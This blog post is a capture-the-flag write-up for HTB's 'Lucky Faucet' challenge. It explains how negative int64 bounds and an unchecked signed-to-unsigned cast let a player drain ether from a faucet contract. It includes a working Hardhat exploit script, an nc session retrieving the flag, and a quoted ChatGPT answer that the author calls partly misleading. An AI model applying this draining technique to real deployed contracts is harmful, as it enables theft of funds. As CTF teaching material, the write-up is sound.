---
published: 2024-03-16
tags:
- Blockchain
title: Lucky Faucet

---

It has been a while since my last CTF but I decided to join the HTB’s CyberApocalypse 2024.  
  
This challenge was pretty easy but also engaging, we have two contracts:  
  
`Setup.sol`

```Solidity
 // SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import {LuckyFaucet} from "./LuckyFaucet.sol";

contract Setup {
    LuckyFaucet public immutable TARGET;

    uint256 constant INITIAL_BALANCE = 500 ether;

    constructor() payable {
        TARGET = new LuckyFaucet{value: INITIAL_BALANCE}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance <= INITIAL_BALANCE - 10 ether;
    }
}
```

Basically we have to withdraw 10 or more ether from the initial contract balance of 500

`LuckyFaucet.sol`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract LuckyFaucet {
    int64 public upperBound;
    int64 public lowerBound;

    constructor() payable {
        // start with 50M-100M wei Range until player changes it
        upperBound = 100_000_000;
        lowerBound =  50_000_000;
    }

    function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :)
        // we don't have infinite money glitch.
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }

    function sendRandomETH() public returns (bool, uint64) {
        int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
        // we can safely cast to uint64 since we'll never 
        // have to worry about sending more than 2**64 - 1 wei 
        uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
        bool sent = msg.sender.send(amountToSend);
        return (sent, amountToSend);
    }
}
```

So, at a first glance we can withdraw at most 10M gwei, now given `1 ETH` = `10e18 Wei` we should do something in the range of `10e15` requests, not really feasible.

Clearly `setBounds` is the target functions to exploit, and there is something weird with `int64` params and the mechanism as a whole.

At this point I decided to query chatGPT on it, just in case

> [!important] Hey chatgpt, do you see any potential bug in the code ?

> Yes, there is a potential bug in the `**sendRandomETH()**` function related to the type conversion of the `**randomInt**` variable. Let me explain:

> The line `**int256 randomInt = int256(blockhash(block.number - 1));**` retrieves the blockhash of the previous block and casts it to an `**int256**` type. This conversion may result in a negative value since the blockhash is a hexadecimal value, and when interpreted as a signed integer, it can be negative.

> Later in the code, the expression `**randomInt % (upperBound - lowerBound + 1) + lowerBound**` is used to generate a random number within the specified range. However, if `**randomInt**` is negative, the result of the modulo operation may also be negative, which can lead to unexpected behavior.

> Additionally, the comment "we can safely cast to uint64" might not hold true if `**randomInt**` is negative and larger than the maximum value representable by a `**uint64**`. This can result in an incorrect amount of Ether being sent or even cause a revert due to underflow.

> To address this issue, you can consider using a more robust method for generating randomness, such as a provably fair random number generator (RNG) or integrating an external randomness source like Chainlink VRF (Verifiable Random Function). These methods ensure that the generated random number is unbiased and cannot be manipulated by miners or other parties.

> In summary, the potential bug lies in the conversion of the blockhash to an integer and the subsequent calculation of the random number. Using a more reliable method for generating randomness would improve the security and reliability of the contract.

  

I have to admit that chatGPT is amazing at gaslighting, everything seems to make sense even though it doesn’t really add up. However it mentions the `setBounds` functions and negative integers/modulus that is an interesting starting point.

It’s not exactly how chatGPT described it, but clearly the problem is that there is no check for negative numbers and uint works with modulus.

```Python
  require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
  require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
  require(_newLowerBound <= _newUpperBound);
```

We need to take out around `~ 2**63 wei`, the modulus is `2**64`therefore if we manage to put a random negative number in the modulus we can expect to drain the `10 eth` in a few attempts  
  

```JavaScript
import { ethers } from "hardhat";

async function main() {

    const SetupAddress = "0xcFAF2992b981cAB5a01206C5705A3AbEFC76B4C4"
    const Setup = await ethers.getContractAt("Setup", SetupAddress);
    console.log(`Setup: ${await Setup.getAddress()}`);
    console.log(`isSolved: ${await Setup.isSolved()}`);


    const LuckyFaucetAddress = await Setup.TARGET()
    const LuckyFaucet = await ethers.getContractAt("LuckyFaucet", LuckyFaucetAddress);
    console.log(`LuckyFaucet: ${await LuckyFaucet.getAddress()}`);

    const targetBalancePre = await ethers.provider.getBalance(LuckyFaucetAddress)
    console.log(`targetBalance: ${targetBalancePre}`);

    const newUpperBound = - (10_000_000_000)
    const newLowerBound = - (50_000_000_000)
    await LuckyFaucet.setBounds(newLowerBound, newUpperBound)
    const result = await LuckyFaucet.sendRandomETH()
    console.log(`sendRandomEth: ${result[0]} ${result[1]}`);

    const targetBalancePost = await ethers.provider.getBalance(LuckyFaucetAddress)
    console.log(`diff: ${targetBalancePost - targetBalancePre}`);
    console.log(`isSolved: ${await Setup.isSolved()}`);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

This is actually the first time I used `hardhat` to make this sort of challenges and I have to admit that is waay superior to python for the task

And finally we get the flag

```Bash
$ nc 83.136.252.62 38754
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{1_f0rg0r_s0m3_U}
```